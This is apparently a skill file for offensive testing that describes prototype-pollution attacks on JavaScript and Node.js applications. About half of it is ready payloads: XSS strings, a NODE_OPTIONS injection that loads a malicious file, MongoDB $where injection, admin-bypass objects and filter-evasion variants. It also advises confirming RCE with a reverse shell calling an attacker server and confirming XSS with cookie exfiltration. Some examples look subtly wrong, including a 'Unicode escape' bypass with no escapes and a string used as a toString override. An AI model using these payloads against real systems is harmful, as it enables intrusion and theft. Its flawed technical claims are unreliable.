---
name: prototype_pollution
description: JavaScript/Node.js prototype pollution attacks covering client-side XSS, server-side RCE, and property injection techniques
---

# Prototype Pollution

Prototype pollution allows attackers to inject properties into JavaScript object prototypes, affecting all objects in the application. This can lead to XSS (client-side), RCE (server-side), or logic bypass.

## Attack Surface

**Client-Side (XSS)**
- `Object.assign()` with untrusted input
- jQuery `$.extend(true, {}, userInput)`
- Lodash `_.merge()`, `_.defaultsDeep()`
- Deep merge utilities in frontend frameworks
- URL query parameter parsers that create nested objects

**Server-Side (RCE/DoS)**
- Express.js middleware merging request body
- MongoDB query operators (`$where`, `$regex`)
- Template engines accessing polluted properties
- Child process spawning with polluted options
- `child_process.exec()` with polluted `shell` option

**Common Sinks**
- `Object.assign(target, source)`
- `_.merge(target, source)`
- `$.extend(true, target, source)`
- Custom recursive merge functions
- `JSON.parse()` followed by merge

## Detection Channels

**Static Analysis**
- Search for merge/extend functions with user input
- Trace `req.body`, `req.query`, `req.params` to merge operations
- Check for `__proto__`, `constructor.prototype` access patterns
- Look for recursive object traversal without prototype checks

**Dynamic Analysis**
- Inject `__proto__` or `constructor[prototype]` in JSON body
- Observe if property appears on new objects: `({}).polluted`
- Test with `{"__proto__": {"isAdmin": true}}`
- Check if `Object.keys({}).includes('polluted')` returns true

**Error-Based**
- Some frameworks throw on `__proto__` access (good sign - they're protected)
- TypeError when accessing polluted properties in strict mode

## Exploitation Techniques

### Basic Pollution Vector

```javascript
// Vulnerable merge function
function merge(target, source) {
  for (let key in source) {
    if (source[key] instanceof Object) {
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
}

// Attack payload
const payload = JSON.parse('{"__proto__": {"isAdmin": true}}');
merge({}, payload);

// Verify pollution
const user = {};
console.log(user.isAdmin); // true - pollution successful
```

### Client-Side XSS

Pollute properties used in HTML rendering:
```javascript
// Pollute innerHTML or src
{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}
{"__proto__": {"src": "javascript:alert(1)"}}

// Pollute template variables
{"__proto__": {"user": {"name": "<script>alert(1)</script>"}}}

// Pollute Angular/Vue/React props
{"__proto__": {"ng-bind-html": "constructor.constructor('alert(1)')()"}}
```

### Server-Side RCE (Node.js)

**Child Process Execution**
```javascript
// Pollute shell option
{"__proto__": {"shell": "/bin/bash"}}

// When app spawns process:
const { exec } = require('child_process');
exec('echo hello'); // Now executes in /bin/bash with polluted env

// Pollute NODE_OPTIONS
{"__proto__": {"NODE_OPTIONS": "--require /tmp/evil.js"}}
```

**Status Code Override**
```javascript
// Pollute HTTP status
{"__proto__": {"status": 500}}

// All responses now return 500
res.send('OK'); // Actually returns 500
```

**Template Injection**
```javascript
// Pollute template context
{"__proto__": {"admin": true, "role": "superuser"}}

// Template renders with polluted values
<% if (admin) { %> <div>Admin Panel</div> <% } %>
```

### Authentication Bypass

```javascript
// Pollute user object
{"__proto__": {"isAdmin": true, "role": "admin"}}

// App checks: if (user.isAdmin) grantAccess();
// Now all users are admins
```

### MongoDB Query Injection

```javascript
// Pollute query operators
{"__proto__": {"$where": "sleep(5000)"}}

// All MongoDB queries now include $where clause
db.users.find({name: req.body.name}); // Becomes: find({name: 'x', $where: 'sleep(5000)'})
```

## Advanced Techniques

**Constructor Pollution**
```javascript
// Alternative to __proto__
{"constructor": {"prototype": {"polluted": true}}}

// Works when __proto__ is blocked
```

**Nested Pollution**
```javascript
// Deep nesting to bypass shallow checks
{"a": {"b": {"__proto__": {"polluted": true}}}}
```

**Array Pollution**
```javascript
// Pollute Array.prototype
{"__proto__": {"polluted": true}}

// Now all arrays have .polluted property
[].polluted === true
```

**toString/valueOf Override**
```javascript
// Override type coercion
{"__proto__": {"toString": "function(){return 'pwned'}"}}

// String concatenation now returns 'pwned'
'prefix' + {} // 'prefixpwned'
```

## Bypass Techniques

**Bypass `__proto__` Blocks**
```javascript
// Use constructor.prototype
{"constructor": {"prototype": {"polluted": true}}}

// Use JSON.parse with computed property
JSON.parse('{"__proto__": {"polluted": true}}')

// Use bracket notation in merge
{"__proto__": {"polluted": true}} // vs {["__proto__"]: {"polluted": true}}
```

**Bypass Shallow Checks**
```javascript
// Nest pollution payload
{"legitimate": {"data": {"__proto__": {"polluted": true}}}}
```

**Bypass Allowlists**
```javascript
// Use numeric keys (converted to strings)
{"0": {"__proto__": {"polluted": true}}}

// Use Unicode escapes
{"__proto__": {"polluted": true}}
```

## Validation

**Confirm Pollution**
```javascript
// After injecting payload, check:
const test = {};
console.log(test.pollutedProperty); // Should be true/defined

// Or in browser console:
({}).pollutedProperty
```

**Confirm XSS**
- Inject payload, navigate to page rendering user data
- Check if `alert(1)` fires or DOM contains injected HTML
- Use `document.cookie` exfiltration to confirm

**Confirm RCE**
- Inject `NODE_OPTIONS` payload with reverse shell
- Check for callback to attacker server
- Create marker file: `touch /tmp/pwned`

**Avoid False Positives**
- Property exists on object ≠ pollution (could be legitimate)
- Check if property exists on NEW objects: `({}).prop`
- Verify pollution persists across object creation

## Impact

- **Client-Side XSS**: Inject scripts via polluted properties
- **Server-Side RCE**: Execute arbitrary commands via `child_process`
- **Authentication Bypass**: Grant admin privileges to all users
- **Denial of Service**: Crash application with infinite loops or memory exhaustion
- **Data Exfiltration**: Override security checks to leak sensitive data

## Pro Tips

1. **Test with safe payload first** - `{"__proto__": {"polluted": "test"}}` then check `({}).polluted`
2. **Check all merge functions** - `Object.assign`, `_.merge`, `$.extend`, custom merges
3. **Look for recursive merges** - shallow merges are usually safe, deep merges are vulnerable
4. **Test in browser console** - verify pollution before exploiting
5. **Chain with other vulns** - pollution + template injection = RCE
6. **Check Node.js version** - newer versions have some protections
7. **Use curl/httpx/Python scripts for testing
8. **Monitor for WAF blocks** - `__proto__` may be blocked; try `constructor.prototype`
9. **Test all input vectors** - JSON body, query params, cookies, headers
10. **Check for sandbox escapes** - pollution can break out of VM sandboxes
